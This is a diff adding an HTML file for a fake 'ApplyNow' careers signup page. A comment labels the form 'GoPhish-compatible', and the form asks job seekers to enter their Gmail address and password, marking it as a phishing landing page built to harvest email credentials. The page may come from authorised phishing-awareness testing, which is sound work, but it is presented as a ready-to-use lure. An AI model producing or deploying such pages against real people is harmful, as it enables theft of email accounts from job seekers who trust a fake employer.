@@ -1,0 +1,115 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>ApplyNow — Careers</title>
+	<link href="https://fonts.googleapis.com" rel="preconnect"/>
+	<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet"/>
+	<style type="text/css">:root{
+      --bg: #0f172a; --bg2: #111827; --accent: #22d3ee; --accent-2: #818cf8; --text: #e5e7eb;
+      --muted: #94a3b8; --danger: #ef4444; --radius-2xl: 1.25rem; --ring: #22d3ee55; --shadow: 0 20px 40px rgba(0,0,0,.35);
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; margin:0; font-family:'Inter',system-ui,sans-serif; background: radial-gradient(1200px 700px at 20% -10%, #1f2937 0%, transparent 60%), radial-gradient(1000px 600px at 120% 10%, #0ea5e9 0%, transparent 50%), linear-gradient(160deg, var(--bg), var(--bg2)); color: var(--text); display:grid; grid-template-rows:auto 1fr auto; min-height:100vh;}
+    header { display:flex; justify-content:space-between; align-items:center; padding:20px 28px; max-width:1100px; margin:0 auto; }
+    .brand { display:flex; align-items:center; gap:12px; font-weight:700; }
+    .logo { width:40px; height:40px; border-radius:12px; background:linear-gradient(135deg,var(--accent),var(--accent-2)); box-shadow:0 8px 20px rgba(130,157,255,.35);}
+    .nav { display:flex; gap:18px; }
+    .nav a { color: var(--muted); text-decoration:none; font-weight:500; }
+    .nav a:hover { color:#fff; }
+    .hero { display:grid; place-items:center; padding:24px; }
+    .wrap { width:100%; max-width:1100px; display:grid; grid-template-columns:1.1fr .9fr; gap:28px; align-items:center; }
+    @media(max-width:920px){ .wrap{ grid-template-columns:1fr; } }
+    .headline h1 { font-size:clamp(2rem,5vw,3rem); margin:0 0 10px; }
+    .headline p { color: var(--muted); margin:0 0 18px; max-width:60ch; }
+    .badges { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:22px; }
+    .badge { padding:6px 10px; border-radius:999px; background:#0b1220; border:1px solid #1f2937; color:#cbd5e1; font-size:12px; }
+    .card { background:linear-gradient(180deg, rgba(17,24,39,.65), rgba(2,6,23,.65)); border:1px solid #1f2937; backdrop-filter:blur(6px); border-radius:var(--radius-2xl); box-shadow:var(--shadow); padding:22px; }
+    .form-title { font-weight:700; font-size:20px; margin-bottom:6px; }
+    .form-sub { color: var(--muted); font-size:14px; margin-bottom:16px; }
+    form { display:grid; gap:14px; }
+    label { font-size:13px; color:#cbd5e1; display:block; margin-bottom:6px; }
+    .field { position:relative; }
+    input, select { width:100%; padding:12px 14px; border-radius:12px; border:1px solid #273449; background:#0b1220; color:#e5e7eb; outline:none; transition:border .2s, box-shadow .2s, transform .05s; }
+    input:focus, select:focus { border-color:var(--accent); box-shadow:0 0 0 4px var(--ring); }
+    .hint { font-size:12px; color: var(--muted); margin-top:6px; }
+    .error { font-size:12px; color: var(--danger); margin-top:6px; display:none; }
+    .strength { height:8px; border-radius:999px; background:#111827; overflow:hidden; border:1px solid #1f2937; }
+    .bar { height:100%; width:0%; background:linear-gradient(90deg,#ef4444,#f59e0b,#22c55e); transition:width .25s ease; }
+    .row { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
+    @media(max-width:560px){ .row{grid-template-columns:1fr;} }
+    .actions { display:grid; gap:10px; margin-top:6px; }
+    button { padding:12px 16px; border:none; border-radius:14px; cursor:pointer; font-weight:700; letter-spacing:.2px; background:linear-gradient(135deg,var(--accent),var(--accent-2)); color:#0b1020; box-shadow:0 12px 24px rgba(34,211,238,.25); }
+    button:active { transform:translateY(1px); }
+    .ghost { background:#0b1220; color:#e5e7eb; border:1px solid #1f2937; box-shadow:none; }
+    .footnote { font-size:12px; color: var(--muted); text-align:center; }
+    .terms { display:flex; gap:8px; align-items:center; font-size:12px; color: var(--muted); }
+    .terms input { width:16px; height:16px; }
+    footer { padding:20px; text-align:center; color: var(--muted); font-size:12px; }
+    a { color:#93c5fd; }
+	</style>
+</head>
+<body>
+<header>
+<div class="brand">
+<div aria-hidden="true" class="logo"> </div>
+
+<div>Apply<span style="color: var(--accent);">Now</span></div>
+</div>
+
+<nav aria-label="Primary" class="nav"><a href="#roles">Open Roles</a> <a href="#benefits">Benefits</a> <a href="#form">Apply</a></nav>
+</header>
+
+<main class="hero">
+<div class="wrap">
+<section class="headline">
+<div class="badges"><span class="badge">#Hiring</span> <span class="badge">Early Careers</span> <span class="badge">WFH / Hybrid</span></div>
+
+<h1>Launch your career with a team that invests in your growth.</h1>
+
+<p>Join a learning-first workplace. Create your account, upload your resume, and apply to roles in minutes.</p>
+
+<ul style="margin: 0; padding-left:18px; color:#cbd5e1; line-height:1.9;">
+	<li>1 account → apply to all roles</li>
+	<li>Skill-based shortlisting</li>
+	<li>Status updates &amp; interview reminders</li>
+</ul>
+</section>
+
+<aside aria-labelledby="apply-title" class="card" id="form">
+<div class="form-title" id="apply-title">Create your account</div>
+
+<div class="form-sub">Use your Gmail and set a strong password to get started.</div>
+<!-- GoPhish-compatible form -->
+
+<form action="/api/submit" method="POST">
+
+<div class="field"><label for="name">Full Name</label> <input autocomplete="name" id="name" name="username" placeholder="Your Name" required="" type="text"/></div>
+
+<div class="field"><label for="email">Gmail Address</label> <input autocomplete="email" id="email" name="email" placeholder="yourname@gmail.com" required="" type="email"/>
+<div class="hint">Must be a Gmail address (ends with @gmail.com)</div>
+</div>
+
+<div class="row">
+<div class="field"><label for="password">Password</label> <input id="password" name="password" placeholder="••••••••" required="" type="password"/></div>
+
+<div class="field"><label for="confirm">Confirm Password</label> <input id="confirm" name="password" placeholder="••••••••" required="" type="password"/></div>
+</div>
+
+<div class="field"><label for="role">Interested Role</label> <select id="role" name="role" required=""><option disabled="disabled" selected="selected" value="">Select a role</option><option>Software Developer</option><option>Frontend Developer</option><option>Backend Developer</option><option>Full Stack Developer</option><option>Data Analyst</option><option>System Administrator</option><option>DevOps Engineer</option><option>Intern — IT</option> </select></div>
+
+<div class="terms"><input id="terms" required="" type="checkbox"/> <label for="terms">I agree to the <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a>.</label></div>
+
+<div class="actions"><button type="submit">Create Account &amp; Apply</button><button class="ghost" type="button">Continue with Google</button>
+
+<div class="footnote">By continuing, you consent to receive updates about your application.</div>
+</div>
+</form>
+</aside>
+</div>
+</main>
+
+<footer>© ApplyNow Careers • Built for learners and doers</footer>
+<script>
+    document.getElementById('year').textContent = new Date().getFullYear();
+  </script>
+
+</body></html>
